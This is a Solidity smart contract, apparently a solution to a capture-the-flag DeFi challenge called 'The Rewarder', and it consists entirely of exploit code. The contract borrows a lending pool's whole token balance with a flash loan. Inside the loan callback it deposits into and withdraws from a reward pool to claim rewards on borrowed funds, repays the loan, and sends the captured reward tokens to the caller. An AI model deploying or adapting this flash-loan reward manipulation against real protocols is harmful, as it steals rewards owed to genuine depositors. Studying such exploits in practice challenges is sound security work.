pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TheRewarderStealer {
  using Address for address;

  address immutable flashPool;
  address immutable rewardPool;
  IERC20 immutable token;
  IERC20 immutable rewardToken;

  constructor(address _flash, address _reward, IERC20 _token, IERC20 _rewardToken) {
    flashPool = _flash;
    rewardPool = _reward;
    token = _token;
    rewardToken = _rewardToken;
    _token.approve(_reward, type(uint).max);
  }
  
  function attack() external {
    uint bal = token.balanceOf(flashPool);
    flashPool.functionCall(abi.encodeWithSignature("flashLoan(uint256)", bal));
    rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
  }

  function receiveFlashLoan(uint256 amount) external {
    rewardPool.functionCall(abi.encodeWithSignature("deposit(uint256)", amount));
    rewardPool.functionCall(abi.encodeWithSignature("withdraw(uint256)", amount));
    token.transfer(flashPool, amount);
  }
}